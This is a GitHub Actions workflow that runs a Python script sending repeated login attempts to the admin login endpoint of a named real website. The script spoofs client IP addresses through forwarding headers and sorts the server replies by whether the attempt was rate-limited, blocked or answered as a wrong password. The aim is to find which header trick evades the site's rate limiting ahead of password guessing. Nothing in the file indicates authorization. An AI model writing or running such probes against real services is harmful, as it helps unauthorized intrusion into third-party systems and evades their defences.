name: probe5
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: probe5
        run: |
          cat > /tmp/probe5.py <<'PYEOF'
          import json,time,random,urllib.request,urllib.error
          URL="https://www.kufaka.com/adminApi/auth/login"
          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
          AJ={"Referer":"https://www.kufaka.com/package/admin/","Origin":"https://www.kufaka.com","Accept":"application/json, text/plain, */*"}
          rng=random.Random(7777)
          def rip(): return "%d.%d.%d.%d"%(rng.randint(1,223),rng.randint(0,255),rng.randint(0,255),rng.randint(1,254))
          def mk(v):
              if v=="none": return {}
              ip=rip()
              if v=="xff": return {"X-Forwarded-For":ip}
              if v=="cf": return {"CF-Connecting-IP":ip}
              if v=="xreal": return {"X-Real-IP":ip}
              if v=="trio": return {"X-Forwarded-For":ip,"CF-Connecting-IP":ip,"X-Real-IP":ip}
              if v=="xffp": return {"X-Forwarded-For":"10.9.%d.%d"%(rng.randint(1,254),rng.randint(1,254))}
              return {}
          def one(i,v):
              hdr=mk(v); pw="w%d_%s"%(i,v)
              body=json.dumps({"username":"admin","password":pw}).encode()
              r=urllib.request.Request(URL,data=body,method="POST")
              r.add_header("Content-Type","application/json"); r.add_header("User-Agent",UA)
              for k,val in AJ.items(): r.add_header(k,val)
              for k,val in hdr.items(): r.add_header(k,val)
              try:
                  resp=urllib.request.urlopen(r,timeout=20); st=resp.status; b=resp.read().decode("utf-8","ignore"); ps=resp.headers.get("proxy-status",""); via=resp.headers.get("via","")[:60]
              except urllib.error.HTTPError as e:
                  st=e.code; ps=e.headers.get("proxy-status",""); via=e.headers.get("via","")[:60]
                  try: b=e.read().decode("utf-8","ignore")
                  except Exception: b=""
              except Exception as e:
                  print("V %d %-6s EXC %s"%(i,v,type(e).__name__),flush=True); return
              if "用户名或密码不正确" in b: cat="real"
              elif "操作频繁" in b: cat="rl"
              elif "访问已被拦截" in b: cat="blk"
              elif st==520 and not b: cat="520"
              else: cat="other"
              print("V %d %-6s st=%s cat=%s len=%d via=%s b=%r"%(i,v,st,cat,len(b),via,b[:100]),flush=True)
          variants=["none","xff","cf","xreal","trio","xffp"]
          for rnd in range(3):
              print("== ROUND %d =="%rnd,flush=True)
              for v in variants:
                  one(rnd*10+len(v),v)
                  time.sleep(1.2)
          print("== XFF-ONLY STREAM ==",flush=True)
          for i in range(10):
              one(100+i,"xff")
              time.sleep(1.2)
          print("DONE",flush=True)
          PYEOF
          python3 /tmp/probe5.py
